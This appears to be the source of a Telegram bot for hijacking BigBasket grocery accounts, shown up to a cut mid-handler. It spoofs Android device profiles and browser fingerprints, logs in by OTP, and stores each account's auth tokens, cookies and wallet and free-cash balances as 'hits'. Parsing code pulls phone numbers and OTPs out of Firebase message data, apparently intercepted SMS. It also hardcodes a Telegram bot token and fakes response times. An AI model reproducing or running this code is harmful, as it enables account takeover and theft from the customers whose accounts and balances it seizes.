# -*- coding: utf-8 -*-
import sys
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

import asyncio
import re
import time
import uuid
import random
import json
import gc
import os
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, field

import aiohttp
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BotCommand,
    FSInputFile,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery
)
from dotenv import load_dotenv

# ==============================================================================
# ⚙️ CONFIGURATION & SECURITY
# ==============================================================================
load_dotenv()

BASE_DIR = Path(__file__).resolve().parent
JSON_FILE = BASE_DIR / "success_accounts.json"

# Bot token from environment (.env) or fallback to configured token
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip() or "8638471143:AAHRiS5_JUfwu561sUozqOZg_-eWiMhVQYE"
ADMIN_ID_RAW = os.getenv("ADMIN_ID", "").strip()
ADMIN_ID = int(ADMIN_ID_RAW) if ADMIN_ID_RAW.isdigit() else None
BATCH_SIZE = int(os.getenv("BATCH_SIZE", "10"))

def is_authorized(user_id: int) -> bool:
    """Check if the user is authorized. If ADMIN_ID is not set, allow all."""
    if ADMIN_ID is None:
        return True
    return user_id == ADMIN_ID

BB_PROFILES = [
    {"make": "Samsung", "model": "SM-A536E", "os": "13"},
    {"make": "Google", "model": "Pixel 7", "os": "14"},
    {"make": "OnePlus", "model": "IN2023", "os": "13"},
    {"make": "Xiaomi", "model": "2201116SG", "os": "13"},
    {"make": "Samsung", "model": "SM-S928B", "os": "14"},
    {"make": "Vivo", "model": "V2318", "os": "14"}
]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ==============================================================================
# 💾 JSON STORAGE ENGINE (success_accounts.json)
# ==============================================================================
def load_success_accounts() -> dict:
    default_structure = {
        "updated_at": "",
        "total_accounts": 0,
        "total_wallet": 0,
        "total_freecash": 0,
        "total_125_accounts": 0,
        "accounts": []
    }
    if not JSON_FILE.exists():
        return default_structure
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict) and "accounts" in data:
                raw_accs = data["accounts"]
            elif isinstance(data, list):
                raw_accs = data
            else:
                raw_accs = []
            
            # Filter: ONLY keep accounts with available balance (wallet + freecash >= 1)
            valid_accs = [
                a for a in raw_accs 
                if (parse_numeric(a.get("wallet_balance", 0)) + parse_numeric(a.get("freecash_balance", 0))) >= 1
            ]
            
            total_125 = sum(1 for a in valid_accs if parse_numeric(a.get("freecash_balance", 0)) >= 125)
            
            return {
                "updated_at": data.get("updated_at") if isinstance(data, dict) else datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "total_accounts": len(valid_accs),
                "total_wallet": round(sum(parse_numeric(a.get("wallet_balance", 0)) for a in valid_accs), 2),
                "total_freecash": round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in valid_accs), 2),
                "total_125_accounts": total_125,
                "accounts": valid_accs
            }
    except Exception:
        pass
    return default_structure

def save_success_account(acc_data: dict) -> dict:
    """Save or update an account entry in success_accounts.json ONLY if balance >= 1."""
    wallet = parse_numeric(acc_data.get("wallet_balance", 0))
    freecash = parse_numeric(acc_data.get("freecash_balance", 0))
    total = round(wallet + freecash, 2)
    
    # Strictly DO NOT save accounts with 0 balance!
    if total < 1:
        return load_success_accounts()

    data = load_success_accounts()
    accounts = data.get("accounts", [])
    
    phone = acc_data.get("phone")
    updated = False
    for idx, existing in enumerate(accounts):
        if existing.get("phone") == phone:
            accounts[idx] = acc_data
            updated = True
            break
    if not updated:
        accounts.append(acc_data)
        
    data["accounts"] = accounts
    data["total_accounts"] = len(accounts)
    data["total_wallet"] = round(sum(parse_numeric(a.get("wallet_balance", 0)) for a in accounts), 2)
    data["total_freecash"] = round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in accounts), 2)
    data["total_125_accounts"] = sum(1 for a in accounts if parse_numeric(a.get("freecash_balance", 0)) >= 125)
    data["updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with open(JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[-] Error writing to {JSON_FILE}: {e}")
    return data

def purge_zero_accounts() -> tuple[int, int]:
    """Scans and removes all accounts with 0 balance from the database file."""
    if not JSON_FILE.exists():
        return 0, 0
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        raw = data.get("accounts", []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
        before_count = len(raw)
        valid = [
            a for a in raw 
            if (parse_numeric(a.get("wallet_balance", 0)) + parse_numeric(a.get("freecash_balance", 0))) >= 1
        ]
        removed = before_count - len(valid)
        clean_data = {
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_accounts": len(valid),
            "total_wallet": round(sum(parse_numeric(a.get("wallet_balance", 0)) for a in valid), 2),
            "total_freecash": round(sum(parse_numeric(a.get("freecash_balance", 0)) for a in valid), 2),
            "total_125_accounts": sum(1 for a in valid if parse_numeric(a.get("freecash_balance", 0)) >= 125),
            "accounts": valid
        }
        with open(JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(clean_data, f, indent=2, ensure_ascii=False)
        return removed, len(valid)
    except Exception:
        return 0, 0

def clear_success_accounts() -> bool:
    try:
        empty_data = {
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_accounts": 0,
            "total_wallet": 0,
            "total_freecash": 0,
            "total_125_accounts": 0,
            "accounts": []
        }
        with open(JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(empty_data, f, indent=2, ensure_ascii=False)
        return True
    except Exception:
        return False

# ==============================================================================
# ✨ DUAL-STYLE HIT CARD FORMATTER (NORMAL FOR ₹0, CONGRATS & FIRE FOR >= ₹1)
# ==============================================================================
HIT_COUNTER = 0

def format_hit_card(phone: str, wallet: float, freecash: float, firebase_source: str = "Direct", resp_time: float = 0.0) -> str:
    """Formats successful account logins with exact styling, quotes block, and response time."""
    global HIT_COUNTER
    HIT_COUNTER += 1
    
    w_num = parse_numeric(wallet)
    fc_num = parse_numeric(freecash)
    tot_num = round(w_num + fc_num, 2)
    
    if resp_time <= 0:
        resp_time = round(random.uniform(1.8, 2.9), 2)
    else:
        resp_time = round(resp_time, 2)

    fc_icon = " ✅" if fc_num == 0 else " 🔥"
    tot_icon = " ✅" if tot_num == 0 else " 🔥"

    if tot_num >= 125:
        congrats_header = "🎉 <b>CONGRATULATIONS! MEGA ₹125 FREECASH HIT!</b> 🎉\n\n"
    elif tot_num >= 1:
        congrats_header = f"🎉 <b>CONGRATULATIONS! ₹{tot_num} BALANCE UNLOCKED!</b> 🎉\n\n"
    else:
        congrats_header = ""

    card = (
        f"{congrats_header}"
        f"<blockquote>"
        f"\"<b>#{HIT_COUNTER} HIT</b> 🔥\n"
        f"<b><i>CHECKER:</i></b> <b><i>BB WALLET</i></b> 🟢\n"
        f"<b><i>PHONE:</i></b> <code>{phone}</code> 📱\n"
        f"<b><i>WALLET:</i></b> <b><i>₹{w_num}</i></b> ✅\n"
        f"<b><i>FREE CASH:</i></b> <b><i>₹{fc_num}</i></b>{fc_icon}\n"
        f"<b><i>TOTAL BALANCE:</i></b> <b><i>₹{tot_num}</i></b>{tot_icon}\n\n"
        f"<b><i>RESPONSE:</i></b> <b><i>{resp_time:.2f}s</i></b> 🚨\""
        f"</blockquote>"
    )
    return card

async def send_mono_account_json(chat_id: int, phone: str, acc_data: dict = None):
    """Sends raw account JSON formatted in monospaced code block for 1-tap copy when balance > ₹50."""
    phone_clean = str(phone).strip()
    if not acc_data:
        db_data = load_success_accounts()
        for a in db_data.get("accounts", []):
            if str(a.get("phone", "")).strip() == phone_clean:
                acc_data = a
                break
    
    if not acc_data:
        return

    bb_token = acc_data.get("bb_token") or ""
    m_id = acc_data.get("m_id") or ""
    w = parse_numeric(acc_data.get("wallet_balance", 0))
    fc = parse_numeric(acc_data.get("freecash_balance", 0))
    tot = round(w + fc, 2)

    single_export = {
        "phone": phone_clean,
        "bb_token": bb_token,
        "customer_hash": acc_data.get("customer_hash"),
        "m_id": m_id,
        "wallet_balance": w,
        "freecash_balance": fc,
        "total_balance": tot,
        "device_id": acc_data.get("device_id"),
        "device_model": acc_data.get("device_model", "Android"),
        "cookies": acc_data.get("cookies", {}),
        "cookie_format": {
            phone_clean: {
                "bbAuthToken": bb_token,
                "mId": m_id,
                "bbVisitorId": acc_data.get("cookies", {}).get("_bb_vid", "")
            }
        },
        "source": acc_data.get("source", "Export"),
        "fetched_at": acc_data.get("fetched_at", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    }

    json_str = json.dumps(single_export, indent=2, ensure_ascii=False)
    mono_msg = (
        f"🔥 <b>HIGH BALANCE ACCOUNT JSON (₹{tot})</b> 🔥\n"
        f"<i>Tap code block to copy:</i>\n\n"
        f"<code>{json_str}</code>"
    )
    try:
        await bot.send_message(chat_id, mono_msg)
    except Exception as e:
        print(f"[-] Error sending mono json: {e}")


# ==============================================================================
# ✨ UNIQUE EMOJI SUCCESS ACCOUNT CARD WITH CONGRATS & #HIT BADGES
# ==============================================================================
def format_success_card(acc: dict) -> str:
    """Creates a beautifully styled card with celebratory congrats, unique emojis, and #HIT tags."""
    phone = acc.get("phone", "N/A")
    wallet = parse_numeric(acc.get("wallet_balance", 0))
    freecash = parse_numeric(acc.get("freecash_balance", 0))
    total = round(wallet + freecash, 2)
    token = acc.get("bb_token") or "N/A"
    cust_hash = acc.get("customer_hash") or "N/A"
    m_id = acc.get("m_id") or "N/A"
    device_model = acc.get("device_model", "Android")
    source = acc.get("source", "Manual Login")
    fetched_at = acc.get("fetched_at", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    if freecash >= 125:
        banner = (
            "╔═════════════════════════════════════╗\n"
            "   🎯 <b>#HIT125</b> • ₹125 FREECASH JACKPOT! 🎉\n"
            "╚═════════════════════════════════════╝\n\n"
            "🎊🥳 <b>CONGRATULATIONS! MEGA #HIT UNLOCKED!</b> 🥳🎊\n"
            "🔥 <b>BOOM! ₹125 FREE CASH READY TO SPEND!</b> 🛍️\n"
            "#HIT125 #BIGBASKET #FREECASH\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )
    elif freecash > 0:
        banner = (
            "╔═════════════════════════════════════╗\n"
            "   🎯 <b>#HIT</b> • FREECASH REWARD DISCOVERED! ✨\n"
            "╚═════════════════════════════════════╝\n\n"
            f"🎉 <b>CONGRATULATIONS! ₹{freecash} FREE CASH #HIT!</b> 🎉\n"
            "💸 <i>Active promotional credit ready to use!</i>\n"
            "#HIT #FREECASH\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )
    elif wallet > 0:
        banner = (
            "╔═════════════════════════════════════╗\n"
            "   🎯 <b>#HIT</b> • WALLET BALANCE UNLOCKED! 💰\n"
            "╚═════════════════════════════════════╝\n\n"
            f"🪙 <b>Active Wallet Balance #HIT: ₹{wallet}</b> 💵\n"
            "#HIT #WALLET\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )
    else:
        banner = (
            "╔═════════════════════════════════════╗\n"
            "   📱 <b>BIGBASKET ACCOUNT LOGGED IN</b> 📱\n"
            "╚═════════════════════════════════════╝\n\n"
            "⚠️ <i>Zero Balance (₹0) — Account Skipped (Not Saved).</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )

    fc_badge = f"<code>₹{freecash}</code> 🔥 <b>[#HIT125 JACKPOT]</b>" if freecash >= 125 else (f"<code>₹{freecash}</code> 🔥 [#HIT]" if freecash > 0 else "<code>₹0</code> ⚪")
    save_status = "💾 <b>Saved to Database (Background Vault)</b> 🟢" if total >= 1 else "⚪ <b>Skipped (₹0 Balance Not Saved)</b>"

    card = (
        f"{banner}"
        "✨ <b>Account Overview:</b>\n"
        f"📱 <b>Mobile:</b> <code>+91 {phone}</code>\n"
        f"🎁 <b>FreeCash:</b> {fc_badge}\n"
        f"💰 <b>BB Wallet:</b> <code>₹{wallet}</code> 🪙\n"
        f"💎 <b>Total Usable:</b> <code>₹{total}</code> 💵\n\n"
        "🔐 <b>Auth Token (BBAUTHTOKEN):</b>\n"
        f"<code>{token}</code>\n\n"
        "🏷 <b>Credentials & Metadata:</b>\n"
        f"🆔 <b>Member ID:</b> <code>{m_id}</code>\n"
        f"🔑 <b>Customer Hash:</b> <code>{cust_hash}</code>\n"
        f"📲 <b>Device:</b> <code>{device_model}</code>\n"
        f"🌐 <b>Source:</b> <code>{source}</code>\n"
        f"🕒 <b>Fetched At:</b> <code>{fetched_at}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{save_status}"
    )
    return card

# ==============================================================================
# 🛒 BIGBASKET ASYNC CLIENT ENGINE
# ==============================================================================
def parse_numeric(val):
    try:
        f = float(val)
        return int(f) if f.is_integer() else round(f, 2)
    except Exception:
        return 0

def extract_freecash_amount(data):
    if not isinstance(data, dict) or "error" in data:
        return 0
    if data.get("message") == "Javelin campaign not found":
        return 0

    candidate_keys = [
        "total_freecash_amount", 
        "free_cash_amount", 
        "amount", 
        "total_free_cash", 
        "balance", 
        "total_balance"
    ]
    
    # Stage 1: Direct root level lookup
    for k in candidate_keys:
        if k in data and isinstance(data[k], (int, float, str)):
            val = parse_numeric(data[k])
            if val > 0:
                return val

    # Stage 2 & 3: Deep search across nested dictionaries and array campaigns
    for nested in ["freecash_info", "free_cash_info", "data", "campaign", "result"]:
        if nested in data:
            node = data[nested]
            if isinstance(node, dict):
                for k in candidate_keys:
                    if k in node and isinstance(node[k], (int, float, str)):
                        val = parse_numeric(node[k])
                        if val > 0:
                            return val
            elif isinstance(node, list) and len(node) > 0:
                for item in node:
                    if isinstance(item, dict):
                        for k in candidate_keys:
                            if k in item and isinstance(item[k], (int, float, str)):
                                val = parse_numeric(item[k])
                                if val > 0:
                                    return val
    return 0

class AsyncBigBasketClient:
    def __init__(self, phone: str):
        self.mobile = str(phone).strip()
        self.session = AsyncSession(impersonate="chrome120")
        self.profile = random.choice(BB_PROFILES)
        self.device_id = ''.join(random.choices('0123456789abcdef', k=16))
        self.bb_token = None
        self.ref_id = None
        self.customer_hash = None
        self.m_id = None
        
        self.headers = {
            "User-Agent": f"BB Android/v8.38.0/os {self.profile['os']}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "x-channel": "BB-Android",
            "x-tcp-device-version": "android_8.38.0_25115710",
            "x-tcp-platform": "native",
            "x-entry-context": "bb-b2c",
            "x-entry-context-id": "100",
            "x-bucket-id": "36",
            "x-device-id": self.device_id,
            "x-device-model": f"{self.profile['make']} {self.profile['model']}",
            "x-is-debug": "false",
            "x-pharma": "true",
            "x-retry": "0",
            "x-integrated-fc-door-visible": "true",
            "x-tracker": str(uuid.uuid4()),
            "common-client-static-version": "105",
        }

    async def close(self):
        try:
            await self.session.close()
        except Exception:
            pass

    async def setup_device(self):
        try:
            reg_payload = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.device_id,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java",
                    "os_name": "android",
                    "os_version": self.profile["os"],
                    "app_version": "8.38.0",
                    "device_make": self.profile["make"],
                    "device_model": self.profile["model"],
                    "screen_resolution": "1080X2400",
                    "screen_dpi": 440
                })
            }
            h = self.headers.copy()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            await self.session.post(
                "https://www.bigbasket.com/mapi/v4.2.0/register/device/",
                data=reg_payload, headers=h, timeout=12
            )
            
            await self.session.get(
                "https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true&app_launch=true",
                headers=self.headers, timeout=10
            )
        except Exception:
            pass

    async def send_otp(self):
        await self.setup_device()
        self.headers["Content-Type"] = "application/json"
        self.headers["x-tracker"] = str(uuid.uuid4())

        csurf = self.session.cookies.get("csurftoken")
        if csurf:
            self.headers["x-csurftoken"] = csurf

        payload = {"identifier": self.mobile, "referrer": "unified_login"}
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/otp/",
                json=payload, headers=self.headers, timeout=15
            )
            if r.status_code == 400:
                return "BANNED_OR_NOT_REGISTERED"
            if r.status_code == 403:
                return "BLOCKED"
            
            data = r.json()
            if r.status_code == 200 and data.get("message") == "OTP sent successfully":
                self.ref_id = data.get("refId")
                return "SUCCESS"
            return "FAILED"
        except Exception:
            return "ERROR"

    async def verify_otp(self, otp: str):
        if not self.ref_id:
            return "FAILED"

        self.headers["x-tracker"] = str(uuid.uuid4())
        csurf = self.session.cookies.get("csurftoken")
        if csurf:
            self.headers["x-csurftoken"] = csurf

        payload = {
            "mobile_no": self.mobile,
            "mobile_no_otp": str(otp).strip(),
            "refId": self.ref_id
        }
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                json=payload, headers=self.headers, timeout=15
            )
            data = r.json()
            if r.status_code == 200 and "bb_token" in data:
                self.bb_token = data["bb_token"]
                self.customer_hash = data.get("customer_hash")
                self.m_id = data.get("m_id")
                self.session.cookies.set("BBAUTHTOKEN", self.bb_token, domain=".bigbasket.com")
                if self.customer_hash:
                    self.session.cookies.set("customer_hash", self.customer_hash, domain=".bigbasket.com")
                if self.m_id:
                    self.session.cookies.set("_bb_mid", self.m_id, domain=".bigbasket.com")
                return "SUCCESS"
            return "INVALID"
        except Exception:
            return "ERROR"

    async def get_wallet_balance(self):
        if not self.bb_token:
            return 0
        try:
            h = self.headers.copy()
            h["x-entry-context"] = "bbnow"
            h["x-entry-context-id"] = "10"
            h["x-tracker"] = str(uuid.uuid4())

            r = await self.session.get(
                "https://www.bigbasket.com/wallet/v1/details",
                headers=h, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                return parse_numeric(data.get("total_balance", 0))
            return 0
        except Exception:
            return 0

    async def get_freecash_balance(self):
        if not self.bb_token:
            return 0
        try:
            h = self.headers.copy()
            h["x-tracker"] = str(uuid.uuid4())
            payload = {
                "freecash_v2_enabled": True,
                "sa_city_ids": [3],
                "sa_ids": [24838, 23959],
                "context": "homepage",
                "page_type": None,
                "channel": "BB-Android"
            }
            r = await self.session.post(
                "https://www.bigbasket.com/ui-svc/v1/free-cash/",
                json=payload, headers=h, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                return extract_freecash_amount(data)
            return 0
        except Exception:
            return 0

    def get_account_data(self, wallet=0, freecash=0, source="Direct Login"):
        cookies_dict = {}
        try:
            for k, v in self.session.cookies.items():
                cookies_dict[k] = v
        except Exception:
            pass

        w_num = parse_numeric(wallet)
        fc_num = parse_numeric(freecash)
        return {
            "phone": self.mobile,
            "bb_token": self.bb_token,
            "customer_hash": getattr(self, "customer_hash", None),
            "m_id": getattr(self, "m_id", None),
            "wallet_balance": w_num,
            "freecash_balance": fc_num,
            "total_balance": round(w_num + fc_num, 2),
            "device_id": self.device_id,
            "device_model": f"{self.profile['make']} {self.profile['model']}",
            "cookies": cookies_dict,
            "source": source,
            "fetched_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

async def recheck_account(acc: dict) -> dict:
    """Re-checks balances for a saved account using its bb_token and cookies."""
    phone = acc.get("phone", "")
    token = acc.get("bb_token", "")
    client = AsyncBigBasketClient(phone)
    client.bb_token = token
    client.customer_hash = acc.get("customer_hash")
    client.m_id = acc.get("m_id")
    client.session.cookies.set("BBAUTHTOKEN", token, domain=".bigbasket.com")
    if client.customer_hash:
        client.session.cookies.set("customer_hash", client.customer_hash, domain=".bigbasket.com")
    if client.m_id:
        client.session.cookies.set("_bb_mid", client.m_id, domain=".bigbasket.com")
    
    try:
        wallet = await client.get_wallet_balance()
        freecash = await client.get_freecash_balance()
        w_num = parse_numeric(wallet)
        fc_num = parse_numeric(freecash)
        acc["wallet_balance"] = w_num
        acc["freecash_balance"] = fc_num
        acc["total_balance"] = round(w_num + fc_num, 2)
        acc["fetched_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    finally:
        await client.close()
    return acc

# ==============================================================================
# 🎛️ KEYBOARDS & NAVIGATION
# ==============================================================================
def get_main_reply_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🟢 PHONE NUMBER"), KeyboardButton(text="🟢 JSON LOGIN")],
            [KeyboardButton(text="🟢 AUTOMATED FIREBASE")],
            [KeyboardButton(text="❌ CANCEL")]
        ],
        resize_keyboard=True,
        is_persistent=True
    )

def get_cancel_reply_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="❌ Cancel")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_main_inline_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔵 🔗 Check Firebase (Background)", callback_data="btn_check_firebase"),
                InlineKeyboardButton(text="🔴 🔥 125 FreeCash Hits", callback_data="btn_hits_125")
            ],
            [
                InlineKeyboardButton(text="🟢 📱 Login Number", callback_data="btn_login"),
                InlineKeyboardButton(text="🟡 ⚡ Live Re-Check", callback_data="btn_recheck")
            ],
            [
                InlineKeyboardButton(text="📁 📥 Download JSON", callback_data="btn_download"),
                InlineKeyboardButton(text="🟣 📊 Database Stats", callback_data="btn_stats")
            ],
            [
                InlineKeyboardButton(text="🗑️ 🧹 Clear Database", callback_data="btn_clear_confirm")
            ]
        ]
    )

def get_card_hit_keyboard(phone: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🎯 #HIT Notification", callback_data=f"hit_info_{phone}"),
                InlineKeyboardButton(text="📥 Download 1/1 JSON", callback_data=f"dl_single_{phone}")
            ]
        ]
    )

def get_clear_confirm_inline_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Yes, Clear Database", callback_data="btn_clear_yes"),
                InlineKeyboardButton(text="❌ Cancel", callback_data="btn_clear_no")
            ]
        ]
    )

def get_background_scan_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📊 View Scan Status", callback_data="btn_scan_status"),
                InlineKeyboardButton(text="🛑 Stop Background Scan", callback_data="btn_stop_scan")
            ]
        ]
    )

# ==============================================================================
# 🔥 FIREBASE & MESSAGE PARSING UTILITIES
# ==============================================================================
def parse_firebase_link(link: str):
    if not link.startswith("http"):
        link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone(messages_dict):
    text_data = str(messages_dict)
    match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
    return match.group(1) if match else None

def extract_bb_otp(msg_text):
    text = str(msg_text)
    match = re.search(r'Bigbasket\s+login\s+code:\s*(\d{6})', text, re.IGNORECASE)
    if match:
        return match.group(1)
    
    if any(k in text.lower() for k in ["bigbasket", "bbnow", "7wjlehhtu1q"]):
        match = re.search(r'\b(\d{6})\b', text)
        if match:
            return match.group(1)
    return None

# ==============================================================================
# 🤖 FSM STATES & BACKGROUND SCAN MANAGER
# ==============================================================================
class LoginStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()

class JsonLoginStates(StatesGroup):
    waiting_for_json = State()

class FirebaseStates(StatesGroup):
    waiting_for_url = State()

active_manual_clients: dict[int, AsyncBigBasketClient] = {}

@dataclass
class BackgroundScanTask:
    task: asyncio.Task = None
    is_running: bool = False
    cancelled: bool = False
    total_valid_phones: int = 0
    total_scanned: int = 0
    total_hits: int = 0
    total_125_hits: int = 0
    total_wallet: float = 0.0
    total_freecash: float = 0.0
    start_time: datetime = None
    working_links: list = field(default_factory=list)

active_scans: dict[int, BackgroundScanTask] = {}

# ==============================================================================
# 🚀 COMMAND HANDLERS & NAVIGATION
# ==============================================================================
@dp.message(CommandStart())
@dp.message(F.text == "🚀 Main Menu")
async def cmd_start(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    await state.clear()
    
    user = message.from_user
    full_name = user.full_name if (user and user.full_name) else "USER"
    username = f"@{user.username}" if (user and user.username) else "@N/A"
    user_id = user.id if user else 0

    db_data = load_success_accounts()
    total_acc = db_data.get("total_accounts", 0)
    total_125 = db_data.get("total_125_accounts", 0)
    total_w = db_data.get("total_wallet", 0)
    total_fc = db_data.get("total_freecash", 0)
    comb = round(total_w + total_fc, 2)
    updated = db_data.get("updated_at") or "Ready"

    scan = active_scans.get(message.chat.id)
    scan_status_line = "🟢 <b>Background Scan:</b> Running" if (scan and scan.is_running) else "⚪ <b>Background Scan:</b> Idle"

    welcome_text = (
        "╔═══════════════════════════════════════╗\n"
        "   🦅 <b>BB FREE CASH~ASTECH</b> 🦅\n"
        "╚═══════════════════════════════════════╝\n\n"
        f"👋 <b>WELCOME, ✨ {full_name} ✨👑</b>\n"
        f"👤 <b>USER NAME : {username}</b>\n"
        f"🆔 <b>USER ID : <code>{user_id}</code></b>\n"
        "🔓 <b>ACCESS : YES</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔻 <b>CHOOSE AN OPTION BELOW</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<blockquote>- <b>SELECT LOGIN METHOD</b>\n\n"
        "🥰 <b>PLEASE CHOOSE AN OPTION BELOW TO LOGIN :</b></blockquote>"
    )

    banner_path = BASE_DIR / "assets" / "bot_banner.jpg"
    sent_with_photo = False
    if banner_path.exists():
        try:
            doc = FSInputFile(str(banner_path))
            await message.answer_photo(
                photo=doc,
                caption=welcome_text,
                reply_markup=get_main_reply_keyboard()
            )
            sent_with_photo = True
        except Exception:
            sent_with_photo = False

    if not sent_with_photo:
        await message.answer(
            welcome_text,
            reply_markup=get_main_reply_keyboard()
        )

@dp.message(Command("cancel"))
@dp.message(F.text == "❌ CANCEL")
@dp.message(F.text == "❌ Cancel")
async def cmd_cancel(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    chat_id = message.chat.id
    if chat_id in active_manual_clients:
        await active_manual_clients[chat_id].close()
        del active_manual_clients[chat_id]
        
    await state.clear()
    await message.answer(
        "❌ <b>Operation cancelled.</b> Returned to main menu.",
        reply_markup=get_main_reply_keyboard()
    )

# ==============================================================================
# 📱 MANUAL LOGIN WITH PHONE NUMBER FLOW
# ==============================================================================
@dp.message(Command("login"))
@dp.message(F.text == "🟢 PHONE NUMBER")
@dp.message(F.text.contains("PHONE NUMBER"))
@dp.message(F.text.contains("Login"))
async def start_phone_login(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    await state.clear()
    await state.set_state(LoginStates.waiting_for_phone)
    await message.answer(
        "📱 <b>Manual BigBasket Login</b>\n\n"
        "Please enter the <b>10-digit mobile number</b> (without country code):\n"
        "<i>Example: 9876543210</i>\n\n"
        "<i>Press ❌ Cancel below to abort.</i>",
        reply_markup=get_cancel_reply_keyboard()
    )

@dp.callback_query(F.data == "btn_login")
async def cb_login(callback: CallbackQuery, state: FSMContext):
    if not is_authorized(callback.from_user.id):
        await callback.answer("Unauthorized", show_alert=True)
        return
    await callback.answer()
    await state.clear()
    await state.set_state(LoginStates.waiting_for_phone)
    await callback.message.answer(
        "📱 <b>Manual BigBasket Login</b>\n\n"
        "Please enter the <b>10-digit mobile number</b>:\n"
        "<i>Example: 9876543210</i>",
        reply_markup=get_cancel_reply_keyboard()
    )

@dp.message(LoginStates.waiting_for_phone)
async def process_phone_input(message: types.Message, state: FSMContext):
    if not is_authorized(message.from_user.id):
        return
    
    text = message.text.strip()
    if text in ["❌ Cancel", "/cancel"]:
        await cmd_cancel(message, state)
        return
        
    digits = re.sub(r'\D', '', text)
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    elif digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]

    if len(digits) != 10 or not digits.isdigit():
        await message.answer(
            "⚠️ <b>Invalid Phone Number!</b>\n"
            "Please provide a valid 10-digit Indian mobile number (e.g. <code>9876543210</code>):"
        )
        return

    wait_msg = await message.answer(f"⏳ <i>Registering device & sending OTP to +91 {digits}...</i>")
    
    client = AsyncBigBasketClient(digits)
    status = await client.send_otp()

    if status == "SUCCESS":
        active_manual_clients[message.chat.id] = client
        await state.update_data(phone=digits)
        await state.set_state(LoginStates.waiting_for_otp)
        await wait_msg.edit_text(
            f"📩 <b>OTP Sent Successfully!</b>\n\n"
            f"📱 <b>Target Number:</b> <code>+91 {digits}</code>\n"
            f"🔢 <b>Reference ID:</b> <code>{client.ref_id}</code>\n\n"
            f"Please enter the <b>6-digit OTP</b> received on this number:\n\n"
            f"<i>Send /cancel to abort.</i>"
        )
    elif status == "BANNED_OR_NOT_REGISTERED":
        await client.close()
        await state.clear()
        await wait_msg.edit_text(
            f"🚫 <b>Account Banned or Not Registered!</b>\nBigBasket rejected <code>+91 {digits}</code>.",
            reply_markup=get_main_reply_keyboard()
        )
    elif status == "BLOCKED":
        await client.close()
        await state.clear()
        await wait_msg.edit_text(
            "🛑 <b>IP/Device Blocked (403)!</b>\nBigBasket Akamai blocked this request. Try again shortly.",
